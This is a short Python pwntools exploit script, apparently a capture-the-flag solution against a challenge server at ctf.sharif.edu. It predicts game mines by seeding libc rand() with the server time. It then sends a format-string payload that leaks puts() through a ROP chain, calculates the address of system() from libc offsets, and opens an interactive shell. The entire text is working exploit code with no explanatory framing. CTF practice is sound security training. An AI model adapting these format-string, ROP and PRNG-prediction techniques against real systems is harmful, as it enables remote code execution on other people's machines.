from pwn import *
from ctypes import CDLL

local = False

if local:
	HOST, PORT = '0.0.0.0', 20000
else:
	HOST, PORT = 'ctf.sharif.edu', 54516
r = remote(HOST, PORT)
p = p64

libc = CDLL('libc.so.6')
ts = libc.time(0)
if not local:
	ts -= 1482060028 - 1482060164
libc.srand(ts)

mines = []
for i in range(50):
	x = libc.rand() % 16
	y = libc.rand() % 16
	mines.append((x, y))

print mines

for mine in mines:
	x, y = mine
	r.sendline('%d %d %d' % (1, x, y))
	print x, y
payload = '%7$s~end' + p64(0x603210)
payload = payload.ljust(0x70, 'A') + p(0x41414141) + p(0x401f33) + p(0x401f93) + p(0x401f31) + p(0x603210) + p(0) + p(0x400820) + p(0x401f33) + p(0x40045f) + p(0x400760)
r.recvuntil('nickname?')
r.sendline(payload)
r.recvuntil('submitted!\n')
data = r.recvuntil('~end', drop=True).ljust(8, '\x00')
puts = u64(data)
if local:
	system = puts - 0x6f690 + 0x45390
else:
	system = puts - 0x6b990 + 0x41490
print `data`
r.sendline(str(system & 0xffffffff))
r.interactive()